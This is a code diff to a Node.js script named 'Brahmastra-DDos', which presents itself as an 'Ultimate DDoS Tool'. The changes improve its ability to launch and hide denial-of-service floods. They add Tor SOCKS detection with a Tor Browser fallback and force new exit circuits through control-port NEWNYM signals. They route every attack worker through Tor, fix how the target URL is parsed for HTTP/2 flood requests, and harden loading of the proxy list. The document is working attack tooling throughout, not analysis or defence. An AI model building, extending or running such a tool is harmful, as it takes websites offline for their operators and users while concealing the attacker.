@@ -30,7 +30,6 @@ process.on('unhandledRejection', (reason, promise) => {
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
-const url = require("url");
 const path = require("path");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
@@ -57,12 +56,18 @@ process.on('unhandledRejection', function (reason, promise) {
 const TOR_CONFIG = {
     // Default Tor SOCKS proxy (usually runs on localhost:9050)
     defaultProxy: 'socks5://127.0.0.1:9050',
+    // Standard Tor SOCKS port (127.0.0.1:9050)
+    socksPort: 9050,
     // Circuit rotation interval in seconds
     circuitRotationInterval: 30,
     // Maximum circuits to use before rotation
     maxCircuits: 10,
     // Tor control port for circuit rotation (if available)
     controlPort: 9051,
+    // Tor Browser control port (used if 9051 is not reachable)
+    browserControlPort: 9151,
+    // Tor Browser SOCKS fallback port (used if 9050 is not reachable)
+    browserSocksPort: 9150,
     // Circuit rotation enabled by default
     enabled: false,
     // Connection timeout for Tor requests
@@ -79,6 +84,104 @@ class TorCircuitManager {
         this.lastRotation = Date.now();
         this.agents = new Map();
         this.isEnabled = false;
+        this.warnedUnreachable = false;
+        this.warnedControlPort = false;
+    }
+
+    // Parse host/port from the configured SOCKS proxy URI
+    socksEndpoint() {
+        const match = TOR_CONFIG.defaultProxy.match(/socks5:\/\/([^:/]+):(\d+)/);
+        if (match) {
+            return { host: match[1], port: parseInt(match[2], 10) };
+        }
+        return { host: '127.0.0.1', port: 9050 };
+    }
+
+    // Check whether a Tor SOCKS proxy is actually listening
+    checkTorAvailable(proxyUri = TOR_CONFIG.defaultProxy, timeout = 3000) {
+        return new Promise((resolve) => {
+            const match = String(proxyUri).match(/socks5:\/\/([^:/]+):(\d+)/);
+            const host = match ? match[1] : '127.0.0.1';
+            const port = match ? parseInt(match[2], 10) : 9050;
+
+            const socket = net.connect(port, host);
+            const finish = (result) => {
+                try { socket.destroy(); } catch (e) { /* ignore */ }
+                resolve(result);
+            };
+
+            socket.setTimeout(timeout);
+            socket.once('connect', () => finish({ available: true, host, port }));
+            socket.once('timeout', () => finish({ available: false, host, port, code: 'ETIMEDOUT' }));
+            socket.once('error', (err) => finish({
+                available: false,
+                host,
+                port,
+                code: err.code || err.message
+            }));
+        });
+    }
+
+    // Detect a reachable SOCKS port: try configured port first, then Tor Browser (9150)
+    async detectTorProxy() {
+        let status = await this.checkTorAvailable(TOR_CONFIG.defaultProxy);
+        if (status.available) {
+            return status;
+        }
+
+        const browserUri = `socks5://127.0.0.1:${TOR_CONFIG.browserSocksPort}`;
+        status = await this.checkTorAvailable(browserUri);
+        if (status.available) {
+            TOR_CONFIG.defaultProxy = browserUri;
+            console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Tor found on Tor Browser SOCKS port ${TOR_CONFIG.browserSocksPort}`);
+        }
+        return status;
+    }
+
+    // Send SIGNAL NEWNYM to a Tor control port to force a fresh circuit.
+    // Tries the configured control port first, then Tor Browser's (9151).
+    signalNewnym(timeout = 3000) {
+        const tryPort = (port) => new Promise((resolve) => {
+            const control = net.connect(port, '127.0.0.1');
+            let step = 'greeting';
+            let buffer = '';
+
+            const finish = (ok, info) => {
+                try { control.destroy(); } catch (e) { /* ignore */ }
+                resolve({ ok, info, port });
+            };
+
+            control.setTimeout(timeout);
+            control.once('timeout', () => finish(false, 'control port timeout'));
+            control.once('error', (err) => finish(false, err.code || err.message));
+            control.on('data', (chunk) => {
+                buffer += chunk.toString();
+
+                if (step === 'greeting') {
+                    if (!/^250[- ]/.test(buffer)) {
+                        return finish(false, buffer.trim());
+                    }
+                    control.write('AUTHENTICATE ""\r\n');
+                    step = 'auth';
+                    buffer = '';
+                } else if (step === 'auth') {
+                    if (!/^250[- ]/.test(buffer)) {
+                        return finish(false, `authentication failed: ${buffer.trim()}`);
+                    }
+                    control.write('SIGNAL NEWNYM\r\n');
+                    step = 'signal';
+                    buffer = '';
+                } else if (step === 'signal') {
+                    finish(/^250/.test(buffer.trim()), buffer.trim());
+                }
+            });
+        });
+
+        return (async () => {
+            let result = await tryPort(TOR_CONFIG.controlPort);
+            if (result.ok) return result;
+            return await tryPort(TOR_CONFIG.browserControlPort);
+        })();
     }
 
     // Enable Tor circuit rotation
@@ -113,18 +216,43 @@ class TorCircuitManager {
     }
 
     // Rotate to next circuit
-    rotateCircuit() {
+    async rotateCircuit() {
         if (!this.isEnabled) return;
 
         const now = Date.now();
-        if (now - this.lastRotation >= TOR_CONFIG.circuitRotationInterval * 1000) {
+        if (now - this.lastRotation < TOR_CONFIG.circuitRotationInterval * 1000) {
+            return;
+        }
+
+        this.lastRotation = now;
+        // Workers refresh their sockets silently; the master coordinates NEWNYM + logging
+        const silent = cluster.isWorker;
+
+        // Verify Tor is actually reachable before claiming a rotation
+        const status = await this.checkTorAvailable();
+        if (!status.available) {
+            if (!silent && !this.warnedUnreachable) {
+                this.warnedUnreachable = true;
+                console.log(`[\x1b[31mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Tor SOCKS proxy not reachable at ${status.host}:${status.port} (${status.code}) - circuit rotation paused until Tor is available`);
+            }
+            return;
+        }
+
+        // Clear cached agents so new connections use fresh circuits
+        this.agents.clear();
+
+        if (silent) {
+            return;
+        }
+
+        // Ask the Tor daemon for a new circuit first (NEWNYM)
+        const signal = await this.signalNewnym();
+        if (signal.ok) {
             this.currentCircuit = (this.currentCircuit + 1) % TOR_CONFIG.maxCircuits;
-            this.lastRotation = now;
-            
-            // Clear old agents to force new connections
-            this.agents.clear();
-            
-            console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Rotated to Circuit ${this.currentCircuit + 1}`);
+            console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Rotated to fresh Tor exit circuit (NEWNYM) #${this.currentCircuit + 1}`);
+        } else if (!this.warnedControlPort) {
+            this.warnedControlPort = true;
+            console.log(`[\x1b[33mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Could not signal NEWNYM via control ports ${TOR_CONFIG.controlPort}/${TOR_CONFIG.browserControlPort} (${signal.info}) - falling back to socket cycling`);
         }
     }
 
@@ -191,6 +319,11 @@ class TorCircuitManager {
                             };
                         }
                     } catch (error) {
+                        // Tor daemon not listening - retrying will not help, fail immediately
+                        if (/ECONNREFUSED/.test(error.message) || /ECONNREFUSED/.test(String(error.cause && error.cause.code))) {
+                            throw new Error(`Tor SOCKS proxy not reachable at ${this.socksEndpoint().host}:${this.socksEndpoint().port} - start Tor first (e.g. 'tor' or launch Tor Browser)`);
+                        }
+
                         if (attempt === TOR_CONFIG.maxRetries) {
                             console.log(`[\x1b[33mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Failed to check IP via ${service} after ${TOR_CONFIG.maxRetries} attempts: ${error.message}`);
                         } else {
@@ -284,27 +417,46 @@ if (process.argv.includes('--version') || process.argv.includes('-v')) {
     process.exit();
 }
 
+const headers = {};
+
+// Normalize single-dash flags (-tor, -demo, -show-tor-ip) to double-dash form
+const argsNormalized = process.argv.slice(2).map(arg =>
+    (arg.startsWith('--') ? arg : (arg.startsWith('-') && arg.length > 1 ? '--' + arg.slice(1) : arg)));
+
+// Demo mode flag
+const isDemoMode = argsNormalized.includes('--demo') || process.argv.includes('demo');
+
+// Tor circuit flags
+const isTorEnabled = argsNormalized.includes('--tor') || process.argv.includes('tor');
+const torRotationArg = argsNormalized.find(arg => arg.startsWith('--tor-rotate='));
+const torRotationInterval = torRotationArg ? parseInt(torRotationArg.split('=')[1], 10) : TOR_CONFIG.circuitRotationInterval;
+const showTorIP = argsNormalized.includes('--show-tor-ip') || process.argv.includes('show-tor-ip');
+
+// Flag-only invocation: standalone Tor IP check (e.g. `node Brahmastra-DDos.js --tor --show-tor-ip`)
+const isFlagOnlyTorIPCheck = argsNormalized.every(arg => arg.startsWith('--')) &&
+    showTorIP && isTorEnabled && !isDemoMode;
+
 // Validate required arguments
-if (process.argv.length < 7 && !process.argv.includes('--show-tor-ip')) {
+if (process.argv.length < 7 && !isFlagOnlyTorIPCheck) {
     console.log(`\n🚀 Brahmastra-DDos v2.0.0 - Ultimate DDoS Tool`);
     console.log(`\n❌ Error: Insufficient arguments provided`);
     console.log(`\n📖 Usage: node Brahmastra-DDos.js <target> <time> <rate> <threads> <proxy.txt> [options]`);
     console.log(`\n💡 Tip: Use --help for detailed usage information`);
     process.exit(1);
 }
-const headers = {};
-
-// Demo mode flag
-const isDemoMode = process.argv.includes('demo') || process.argv.includes('--demo');
-
-// Tor circuit flags
-const isTorEnabled = process.argv.includes('--tor') || process.argv.includes('tor');
-const torRotationArg = process.argv.find(arg => arg.startsWith('--tor-rotate='));
-const torRotationInterval = torRotationArg ? parseInt(torRotationArg.split('=')[1]) : TOR_CONFIG.circuitRotationInterval;
-const showTorIP = process.argv.includes('--show-tor-ip') || process.argv.includes('show-tor-ip');
 
 function readLines(filePath) {
-    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+    try {
+        const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
+        if (lines.length === 0) {
+            console.error(`[\x1b[31mERROR\x1b[0m] ${getCurrentTime()} Proxy file '${filePath}' is empty - nothing to load`);
+            process.exit(1);
+        }
+        return lines;
+    } catch (err) {
+        console.error(`[\x1b[31mERROR\x1b[0m] ${getCurrentTime()} Cannot read proxy file '${filePath}': ${err.code || err.message}`);
+        process.exit(1);
+    }
 }
 
 const getCurrentTime = () => {
@@ -346,10 +498,10 @@ const getCurrentTime = () => {
 
 
  function getTitleFromHTML(html) {
-   const titleRegex = /<title>(.*?)<\/title>/i;
+   const titleRegex = /<title>([\s\S]*?)<\/title>/i;
    const match = html.match(titleRegex);
    if (match && match[1]) {
-     return match[1];
+     return match[1].trim();
    }
    return 'Not Found';
  }
@@ -470,6 +622,58 @@ args.proxyFile = process.argv[6];
 
 // Main execution logic
 if (cluster.isMaster) {
+  // Handle standalone Tor IP check FIRST - no screen clearing, no banner, no attack setup
+  if (isFlagOnlyTorIPCheck) {
+    // Direct stdout/stderr writes - bypasses console in case of terminal weirdness,
+    // and mirrors everything to tor-debug.log for diagnostics
+    const debugLogPath = path.join(__dirname, "tor-debug.log");
+    const emitTor = (msg) => {
+      try {
+        fs.writeSync(1, msg + "\n");
+      } catch (e) { /* ignore */ }
+      try {
+        fs.appendFileSync(debugLogPath, `[${new Date().toISOString()}] ${msg}\n`);
+      } catch (e) { /* ignore */ }
+    };
+
+    try {
+      emitTor(`[TOR IP CHECK] ${new Date().toTimeString().slice(0, 8)} Standalone Tor IP Check Mode (pid ${process.pid})`);
+      emitTor(`[TOR IP CHECK] ${new Date().toTimeString().slice(0, 8)} argv=${JSON.stringify(process.argv.slice(2))}`);
+      emitTor("[TOR IP CHECK] " + new Date().toTimeString().slice(0, 8) + " No attack will be performed");
+
+      TOR_CONFIG.circuitRotationInterval = torRotationInterval;
+
+      (async () => {
+        const status = await torManager.detectTorProxy();
+        emitTor(`[TOR IP CHECK] ${new Date().toTimeString().slice(0, 8)} proxy probe: ${JSON.stringify(status)}`);
+        if (!status.available) {
+          emitTor(`[ERROR] Tor SOCKS proxy is not running on 127.0.0.1:${TOR_CONFIG.socksPort} or :${TOR_CONFIG.browserSocksPort} (${status.code})`);
+          emitTor("[ERROR] Start Tor first: run 'tor' in a terminal, or launch Tor Browser, then retry");
+          process.exit(1);
+        }
+
+        torManager.enable();
+        try {
+          const ipInfo = await torManager.getTorIP();
+          emitTor(`[TOR IP CHECK] ${new Date().toTimeString().slice(0, 8)} Current Tor IP: ${ipInfo.ip}`);
+          emitTor(`[TOR IP CHECK] ${new Date().toTimeString().slice(0, 8)} Service: ${ipInfo.service} | Circuit: ${ipInfo.circuit} | Timestamp: ${ipInfo.timestamp}`);
+        } catch (ipError) {
+          emitTor(`[ERROR] IP check failed: ${ipError.message}`);
+        }
+        emitTor(`[TOR IP CHECK] ${new Date().toTimeString().slice(0, 8)} IP check completed. Exiting...`);
+        process.exit(0);
+      })().catch((asyncError) => {
+        emitTor(`[ERROR] Unhandled error in Tor IP check: ${asyncError.stack || asyncError.message}`);
+        process.exit(1);
+      });
+    } catch (syncError) {
+      emitTor(`[ERROR] Fatal error in standalone Tor IP check: ${syncError.stack || syncError.message}`);
+      process.exit(1);
+    }
+
+    return;
+  }
+
   console.clear();
   console.log(`
   🚀 Brahmastra-DDos - Ultimate DDoS Tool v2.0.0
@@ -487,81 +691,85 @@ if (cluster.isMaster) {
   // Handle standalone Tor IP check
   if (showTorIP && !isDemoMode && !isTorEnabled) {
     console.log(`[\x1b[31mERROR\x1b[0m] ${getCurrentTime()} --show-tor-ip requires --tor flag to be enabled`);
-    console.log(`[\x1b[31mERROR\x1b[0m] ${getCurrentTime()} Usage: node Brahmastra-DDos.js target time rate thread proxy.txt --tor --show-tor-ip`);
+    console.log(`[\x1b[31mERROR\x1b[0m] ${getCurrentTime()} Usage: node Brahmastra-DDos.js --tor --show-tor-ip`);
     process.exit(1);
   }
 
-  // Handle standalone Tor IP check (with Tor enabled but no attack)
-  if (showTorIP && isTorEnabled && isDemoMode === false && process.argv.length === 7) {
-    console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Standalone Tor IP Check Mode`);
-    console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} No attack will be performed`);
-    
-    TOR_CONFIG.circuitRotationInterval = torRotationInterval;
-    torManager.enable();
-    
-    setTimeout(async () => {
-      await torManager.showTorIP();
-      console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} IP check completed. Exiting...`);
-      process.exit(0);
-    }, 3000);
-    
-    return;
-  }
-  
   // Enable Tor if flag is set
-  if (isTorEnabled) {
+  const enableTorIfRequested = async () => {
+    if (!isTorEnabled) return true;
+
     TOR_CONFIG.circuitRotationInterval = torRotationInterval;
+
+    // Refuse to run with --tor when the Tor daemon is not up
+    const status = await torManager.detectTorProxy();
+    if (!status.available) {
+      console.log(`[\x1b[31mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Tor SOCKS proxy is not running on 127.0.0.1:${TOR_CONFIG.socksPort} or :${TOR_CONFIG.browserSocksPort} (${status.code})`);
+      console.log(`[\x1b[31mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Start Tor first: run 'tor' in a terminal, or launch Tor Browser, then retry`);
+      process.exit(1);
+    }
+
     torManager.enable();
     console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Circuit Rotation Interval: ${torRotationInterval}s`);
-    
+
     // Show Tor IP if requested
     if (showTorIP) {
       setTimeout(async () => {
         await torManager.showTorIP();
       }, 2000); // Wait 2 seconds for Tor to establish connection
     }
-  }
-  
-  if (isDemoMode) {
-    console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Demo Mode Enabled - No real attacks will be performed`);
-    console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} This is for educational and testing purposes only`);
-    runDemoMode();
-  } else {
+    return true;
+  };
+
+  (async () => {
+    await enableTorIfRequested();
+
+    if (isDemoMode) {
+      console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Demo Mode Enabled - No real attacks will be performed`);
+      console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} This is for educational and testing purposes only`);
+      runDemoMode();
+      return;
+    }
+
     // Only create worker processes if not in demo mode
     for (let i = 1; i <= process.argv[5]; i++){
       cluster.fork();
       console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
     }
     console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
-    
+
     // Start Tor circuit rotation if enabled
     if (isTorEnabled) {
       setInterval(() => {
-        torManager.rotateCircuit();
+        torManager.rotateCircuit().catch(() => {});
       }, 1000);
     }
-    
+
     setInterval(getStatus, 2000);
-    
+
     // Monitor connection pool health every 10 seconds
     setInterval(() => {
         if (typeof connectionPool !== 'undefined' && connectionPool.monitorConnections) {
             connectionPool.monitorConnections();
         }
     }, 10000);
-    
-         setTimeout(() => {
-       console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
-       
-       // Clean up all connections before exiting
-       if (typeof connectionPool !== 'undefined' && connectionPool.cleanup) {
-           connectionPool.cleanup();
-       }
-       
-       process.exit(1);
-     }, process.argv[3] * 1000);
-  }
+
+    setTimeout(() => {
+      console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
+
+      // Clean up all connections before exiting
+      if (typeof connectionPool !== 'undefined' && connectionPool.cleanup) {
+          connectionPool.cleanup();
+      }
+
+      process.exit(1);
+    }, process.argv[3] * 1000);
+  })();
 } else if (!isDemoMode) {
+  // Worker processes must enable Tor too, otherwise they bypass Tor entirely
+  if (isTorEnabled) {
+    torManager.isEnabled = true; // silent enable (avoid log spam in workers)
+  }
   // Only run flooder in worker processes if not in demo mode
   setInterval(runFlooder);
 }
@@ -1110,7 +1318,9 @@ const ip_spoof = () => {
 var proxies = readLines(args.proxyFile);
 const fakeIP = ip_spoof();
 var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
-const parsedTarget = url.parse(args.target);
+// WHATWG URL API (url.parse() is deprecated and insecure)
+const targetUrlStr = /^[a-z][a-z0-9+.-]*:\/\//i.test(args.target) ? args.target : 'https://' + args.target;
+const parsedTarget = new URL(targetUrlStr);
 
 // Headers will be set after randomHeaders is defined
 
@@ -1359,7 +1569,7 @@ const randomHeaders = {
 
 // Set headers after randomHeaders is available
 headers[":method"] = randomMethod;
-headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
+headers[":path"] = parsedTarget.pathname + parsedTarget.search + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
 headers["origin"] = parsedTarget.host;
 headers["Content-Type"] = randomHeaders['Content-Type'];
 headers[":scheme"] = "https";
@@ -1508,9 +1718,9 @@ const connectionPool = {
 };
 
 function runFlooder() {
-    // Rotate Tor circuit if enabled
+    // Rotate Tor circuit if enabled (silent in workers; master handles NEWNYM)
     if (isTorEnabled) {
-        torManager.rotateCircuit();
+        torManager.rotateCircuit().catch(() => {});
     }
     
     const proxyAddr = randomElement(proxies);
